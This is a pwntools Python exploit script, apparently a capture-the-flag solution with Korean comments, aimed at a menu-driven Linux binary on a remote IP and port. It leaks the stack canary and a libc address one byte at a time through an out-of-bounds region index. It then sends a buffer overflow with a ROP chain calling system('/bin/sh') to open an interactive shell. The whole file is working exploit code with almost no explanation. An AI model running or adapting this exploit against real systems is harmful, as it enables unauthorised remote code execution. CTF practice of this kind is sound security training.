from pwn import *
import re, time

# ===== 환경 =====
BIN = './deploy/prob'
#LOCAL = True
LOCAL = False
#HOST, PORT = '127.0.0.1', 54321
HOST, PORT = '3.38.199.229', 54321

libc_path = '/home/user/workspace/ctf/for_user/libc-2.39.so'
#libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc_path)

context.arch = 'amd64'
# context.log_level = 'debug'

# ===== 메뉴 유틸 =====
def new_io():
    io = process(BIN) if LOCAL else remote(HOST, PORT)
    io.recvuntil(b'Select: ')   # 처음 배너 + 첫 Select: 먹기
    return io

def wait_menu(io):
    io.recvuntil(b'Select: ')

def set_region_index(io, idx):
    """Region Index = floor(user_input/256) → 원하는 idx면 입력 = idx*256"""
    io.sendline(b'12')
    io.recvuntil(b':', timeout=1)
    io.sendline(str(idx * 256).encode())
    wait_menu(io)

def show_region_storage_level(io):
    """메뉴 5 출력에서 YY를 파싱해서 리턴"""
    io.sendline(b'5')
    data = io.recvuntil(b'Select: ', drop=False, timeout=1.5)
    m2 = re.search(rb'Storage Level:\s*(\d+)', data)
    lvl = int(m2.group(1)) if m2 else None
    return lvl

def leak_byte_at(io, index):
    set_region_index(io, index)
    return show_region_storage_level(io)

def leak_qword(io, start_index):
    """같은 프로세스에서 8바이트 연속 누수"""
    v = 0
    for i in range(8):
        b = leak_byte_at(io, start_index + i)
        if b is None:
            raise RuntimeError(f'leak fail at idx {start_index+i}')
        v |= (b & 0xff) << (8*i)
    return v

def goto_usr2(io):
    """11 → 4 (gets 자리)"""
#    wait_menu(io)
    io.sendline(b'11')
    io.recvuntil(b'Select: ')
    io.sendline(b'4')
    io.recvuntil(b'Write any remarks: ')

def main():
    io = new_io()

    log.info("Leaking canary (same connection)...")
    canary = leak_qword(io, 40)
    log.success(f"canary = 0x{canary:016x}")

    log.info("Leaking a libc return pointer from stack (same connection)...")
    libc_ptr = leak_qword(io, 56)
    log.success(f"libc-like ptr = 0x{libc_ptr:016x}")

    libc_off = 0x2a1ca 
    libc_base = libc_ptr - libc_off
    log.info("libc base: " + hex(libc_base))

    pop_rdi = libc_base + 0x000000000010f75b
    ret = pop_rdi + 1
    system = libc_base + libc.symbols['system']
    binsh = libc_base + 0x1cb42f

    goto_usr2(io)
    payload = b'A' * 40 + p64(canary) + b'b' * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

    io.send(payload)

    io.interactive()
    io.close()

if __name__ == "__main__":
    main()
